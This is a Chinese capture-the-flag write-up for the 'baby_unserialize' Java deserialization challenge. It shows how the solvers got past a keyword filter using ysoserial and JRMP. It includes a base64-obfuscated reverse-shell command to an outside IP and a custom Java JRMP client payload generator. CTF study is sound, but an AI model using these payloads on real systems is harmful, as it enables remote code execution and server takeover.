# baby_unserialize

> 分类：Web

## 题目描述
Java 反序列化题。存在反序列化入口（`./ser`），URLDNS 链验证可知入口类 `source HashMap` 可用，且目标出网。直接打 CommonsCollections 链会被关键字过滤（`TempleteImport` 类被禁），需用 JRMP 绕过黑名单反弹 shell 拿 flag。

## 考察知识点
- Java 反序列化（ysoserial）
- URLDNS 链验证
- JRMP 绕过黑名单
- 反弹 shell

## 解法
1. 访问 `./ser` 发现反序列化点，用 URLDNS 链验证 HashMap 入口可用、目标出网。
2. 直接打 CC 链会被 waf 过滤，改用 JRMP 绕过。监听 JRMP 服务：
```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1338 CommonsCollections3 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIyLjEzNi4zMy8xMzM3IDA+JjE=}|{base64,-d}|{bash,-i}'
```
3. ysoserial 自带的 JRMPClient 被 waf 掉，重写一个：
```java
package org.example;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Base64;

public class JRMP {
    public static void main(String[] args) throws Exception {
        ObjID id = new ObjID();
        TCPEndpoint te = new TCPEndpoint("124.222.136.33", 1338);
        LiveRef liveRef = new LiveRef(id, te, false);
        UnicastRef ref = new UnicastRef(liveRef);
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(obj);
        oos.close();

        String res = Base64.getEncoder().encodeToString(oos.toByteArray());
        System.out.println(res);
    }
}
```
4. 生成的 payload 再 url 一次编码后打入，监听端口反弹 shell，`env` 拿 flag。

## 参考答案
（未给出，env 中拿 flag）

## 来源
- 作者：Z3r4y（uuzeray） | https://blog.csdn.net/uuzeray/article/details/138274291
- 作者：HvAng | https://hvang10.github.io/2024/04/27/XYCTF2024wp/index.html
- 作者：J1rrY | https://j1rry-learn.github.io/posts/2024-xyctf-webmisc-wp/
